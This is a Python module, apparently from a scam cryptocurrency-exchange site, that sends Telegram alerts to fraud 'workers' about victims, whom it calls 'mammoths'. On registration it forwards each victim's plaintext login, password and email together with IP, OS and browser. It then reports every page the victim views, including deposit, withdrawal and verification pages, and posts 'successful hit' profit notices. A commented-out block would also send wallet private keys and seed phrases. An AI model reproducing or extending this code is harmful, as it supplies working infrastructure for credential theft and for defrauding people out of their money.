import telebot
from .models import *
from exchange import settings


def send_profit_to_channel(worker, amount, currency):
    bot = telebot.TeleBot(settings.BOT_TOKEN)
    if worker:
        worker = worker.user.username
    else:
        worker = 'Не найден'
    currency_name = {'btc': 'Bitcoin', 'eth': "Ethereum", 'ltc': 'Litecoin', 'bch': 'Bitcoin Cash', 'dash': 'Dash',
                     'usdt': 'Tether'}
    bot.send_message(
        settings.PROFIT_CHAT_ID,
        f"""
💎 <b>Успешный залет!</b>

✨ <b>Сервис:</b> <code>Биржа</code>
👤 <b>Воркер:</b> <code>{worker}</code>
💲 <b>Монета:</b> <code>{currency_name[currency]} ({currency.upper()})</code>
💸 <b>Сумма профита:</b> <code>{amount} {currency.upper()}</code>
        """,
        parse_mode='html'
    )


class BotAlert:
    def __init__(self, user, bot_token):
        self.user = user
        self.telegram_id = Trader.objects.filter(user=user).first().telegram_id
        self.bot = telebot.TeleBot(bot_token)

    def new_register(self, data, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='new_register').first()
        if notif.status:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
🔗 <b>Новая регистрация по ссылке.</b>

✨ <b>Сервис:</b> <code>Биржа</code>
🔐 <b>Логин:</b> <code>{data['username']}</code>
🔑 <b>Пароль:</b> <code>{data['password']}</code>
📬 <b>Email:</b> <code>{data['email']}</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>            
                    """
                )
            except:
                pass

    def view_account(self, username, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='view_account').first()
        if notif.status is True:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
👤 <b>Мамонт перешел на страницу профиля.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                    """,
                    parse_mode='html'
                )
            except:
                pass

    def view_deposit(self, username, coin_name, coin, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='view_deposit').first()
        if notif.status:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
💰 <b>Мамонт перешел на страницу пополения средств.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
💲 <b>Монета:</b> <code>{coin_name[coin]} ({coin.upper()})</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                    """,
                    parse_mode='html'
                )
            except:
                pass

    def view_withdraw(self, username, coin_name, coin, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='view_withdraw').first()
        if notif.status:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
💳 <b>Мамонт перешел на страницу вывода средств.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
💲 <b>Монета:</b> <code>{coin_name[coin]} ({coin.upper()})</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                    """,
                    parse_mode='html'
                )
            except:
                pass

    def view_transaction(self, username, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='view_transaction').first()
        if notif.status:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
📚 <b>Мамонт перешел на страницу транзакций.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                    """,
                    parse_mode='html'
                )
            except:
                pass

    def view_settings(self, username, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='view_settings').first()
        if notif.status:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
⚙️ <b>Мамонт перешел на страницу настроек.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                    """,
                    parse_mode='html'
                )
            except:
                pass

    def view_support(self, username, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='view_support').first()
        if 1==1:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
💻 <b>Мамонт перешел на страницу техподдержки.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                    """,
                    parse_mode='html'
                )
            except:
                pass

    def view_kyc(self, username, ip, ua):
        notif = Notification.objects.filter(user=self.user).filter(name='view_kyc').first()
        if notif.status:
            try:
                self.bot.send_message(
                    self.telegram_id,
                    f"""
🖼 <b>Мамонт перешел на страницу верификации.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                    """,
                    parse_mode='html'
                )
            except:
                pass

    def new_docs(self, username, ip, ua):
        try:
            self.bot.send_message(
                self.telegram_id,
                f"""
✅ <b>Мамонт отправил документы на верификацию.</b>

🔐 <b>Мамонт:</b> <code>{username}</code>
✨ <b>Сервис:</b> <code>Биржа</code>

🔍 <b>IP Мамонта:</b> <code>{ip}</code>
🖥 <b>ОС:</b> <code>{ua.os.family}</code>
🌐 <b>Браузер:</b> <code>{ua.browser.family}</code>
                """,
                parse_mode='html'
            )
        except:
            pass

    def send_profit(self, txid, amount, currency):
        currency_name = {'btc': 'Bitcoin', 'eth': "Ethereum", 'ltc': 'Litecoin', 'bch': 'Bitcoin Cash', 'dash': 'Dash',
                         'usdt': 'Tether'}
        try:
            self.bot.send_message(
                self.telegram_id,
                f"""
💎 <b>Успешный залет!</b>

✨ <b>Сервис:</b> <code>Биржа</code>
🔎 <b>Транзакция:</b> <code>{txid}</code>
💲 <b>Монета:</b> <code>{currency_name[currency]} ({currency.upper()})</code>
💸 <b>Сумма профита:</b> <code>{amount} {currency.upper()}</code>
                """,
                parse_mode='html'
            )
        except:
            pass

#
# def send_profit(wallet, worker, amount, currency):

#

#     if worker:
#         worker_id = f'<a href="tg://user?id={worker.user_id}">Перейти</a>'
#     bot.send_message(
#         ADMIN_CHAT_ID,
#         f"""
# 💎 <b>Успешный залет!</b>
#
# 👤 <b>Воркер:</b> {worker_id}
# ✨ <b>Сервис:</b> <code>Биржа</code>
# 💲 <b>Монета:</b> <code>{currency_name[currency]} ({currency.upper()})</code>
# 💸 <b>Сумма профита:</b> <code>{amount} {currency.upper()}</code>
#
# 💳 <b>Кошелек:</b> <code>{wallet.address}</code>
# 🔐 <b>Приватный ключ:</b> <code>{wallet.wif}</code>
# 🔑 <b>SEED Фраза:</b> <code>{wallet.seed}</code>
#             """,
#         parse_mode='html'
#     )
